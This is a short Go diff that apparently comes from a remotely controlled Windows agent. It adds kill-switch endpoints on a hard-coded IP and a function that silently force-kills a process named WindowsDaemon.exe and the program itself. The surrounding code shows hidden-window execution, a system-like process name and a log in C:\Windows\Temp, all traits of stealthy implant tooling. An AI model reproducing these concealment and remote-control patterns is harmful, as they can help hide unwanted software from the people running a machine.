@@ -25,6 +25,8 @@ const MIDURL string = "http://111.231.82.173/"
 const MIDFILE string = "http://111.231.82.173/file/"
 const MIDAUTH string = "http://111.231.82.173:9000/auth"
 const MIDETCD string = "111.231.82.173:2379"
+const MIDKILLIP string = "http://111.231.82.173:9000/Killip"
+const ALLKILL string = "http://111.231.82.173:9000/Allkill"
 const CURRENTPATHLOG = "C:\\Windows\\Temp\\log.txt"
 const CURRENTPATH = "C:\\Windows\\Temp\\"
 
@@ -111,6 +113,14 @@ func KillCheck() {
 	killcheck := exec.Command("taskkill", "/f", "/im", "WindowsDaemon.exe")
 	killcheck.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	// not Start will continue
+	killcheck.Run()
+}
+
+func KillALL() {
+	KillCheck()
+	current_file := strings.Split(os.Args[0], "\\")
+	killcheck := exec.Command("taskkill", "/f", "/im", current_file[len(current_file)-1])
+	killcheck.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	killcheck.Run()
 }
 
